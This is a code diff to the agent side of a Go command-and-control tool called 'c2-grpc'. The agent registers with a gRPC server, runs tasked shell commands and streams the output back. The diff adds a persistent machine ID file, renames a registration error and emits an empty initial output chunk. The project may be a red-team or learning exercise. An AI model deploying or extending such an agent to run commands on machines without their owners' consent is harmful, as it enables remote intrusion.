@@ -11,13 +11,16 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"path/filepath"
 	"runtime"
+	"strings"
 	"sync"
 	"syscall"
 	"time"
 
 	pb "github.com/ardhptr21/c2-grpc/pb"
 	"github.com/creack/pty"
+	"github.com/google/uuid"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/codes"
 	"google.golang.org/grpc/credentials/insecure"
@@ -33,7 +36,7 @@ var (
 	headlessMode bool
 )
 
-var errHostnameAlreadyExists = errors.New("hostname already exists")
+var errAgentAlreadyRegistered = errors.New("agent already registered")
 
 func main() {
 	serverAddr := flag.String("server", "localhost:50051", "gRPC server address")
@@ -50,17 +53,21 @@ func main() {
 	if err != nil {
 		log.Fatalf("hostname error: %v", err)
 	}
+	machineID, err := ensureMachineID()
+	if err != nil {
+		log.Fatalf("machine id error: %v", err)
+	}
 
 	for {
 		if ctx.Err() != nil {
 			return
 		}
 
-		err := runAgentSession(ctx, *serverAddr, hostname)
+		err := runAgentSession(ctx, *serverAddr, hostname, machineID)
 		if ctx.Err() != nil {
 			return
 		}
-		if errors.Is(err, errHostnameAlreadyExists) {
+		if errors.Is(err, errAgentAlreadyRegistered) {
 			agentLog("[agent] %v", err)
 			return
 		}
@@ -77,7 +84,7 @@ func main() {
 	}
 }
 
-func runAgentSession(ctx context.Context, serverAddr, hostname string) error {
+func runAgentSession(ctx context.Context, serverAddr, hostname, machineID string) error {
 	dialCtx, cancelDial := context.WithTimeout(ctx, 5*time.Second)
 	defer cancelDial()
 
@@ -101,13 +108,14 @@ func runAgentSession(ctx context.Context, serverAddr, hostname string) error {
 	defer cancelRegister()
 
 	reg, err := agentServiceClient.Register(registerCtx, &pb.RegisterRequest{
-		Hostname: hostname,
-		Os:       runtime.GOOS,
-		Ip:       "127.0.0.1",
+		Hostname:  hostname,
+		Os:        runtime.GOOS,
+		Ip:        "127.0.0.1",
+		MachineId: machineID,
 	})
 	if err != nil {
 		if status.Code(err) == codes.AlreadyExists {
-			return fmt.Errorf("%w: host %q is already registered", errHostnameAlreadyExists, hostname)
+			return fmt.Errorf("%w: machine %q is already connected", errAgentAlreadyRegistered, machineID)
 		}
 		return fmt.Errorf("register error for host %q: %w", hostname, err)
 	}
@@ -216,6 +224,9 @@ func executeTask(task *pb.Task) {
 		}
 	}
 
+	// Emit an initial chunk so zero-output commands still produce a task record.
+	sendChunk("")
+
 	// Check built-ins
 	switch command {
 	case "sysinfo":
@@ -295,6 +306,46 @@ func unregisterCurrentAgent() {
 	}
 
 	clearSession()
+}
+
+func ensureMachineID() (string, error) {
+	path, err := machineIDPath()
+	if err != nil {
+		return "", err
+	}
+
+	data, err := os.ReadFile(path)
+	if err == nil {
+		id := strings.TrimSpace(string(data))
+		if id != "" {
+			return id, nil
+		}
+	}
+	if err != nil && !errors.Is(err, os.ErrNotExist) {
+		return "", err
+	}
+
+	id := uuid.NewString()
+	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
+		return "", err
+	}
+	if err := os.WriteFile(path, []byte(id+"\n"), 0o600); err != nil {
+		return "", err
+	}
+	return id, nil
+}
+
+func machineIDPath() (string, error) {
+	configDir, err := os.UserConfigDir()
+	if err == nil && configDir != "" {
+		return filepath.Join(configDir, "c2-grpc", "agent-id"), nil
+	}
+
+	homeDir, err := os.UserHomeDir()
+	if err != nil {
+		return "", err
+	}
+	return filepath.Join(homeDir, ".c2-grpc-agent-id"), nil
 }
 
 func runWithPipe(cmd *exec.Cmd, sendChunk func(string)) {
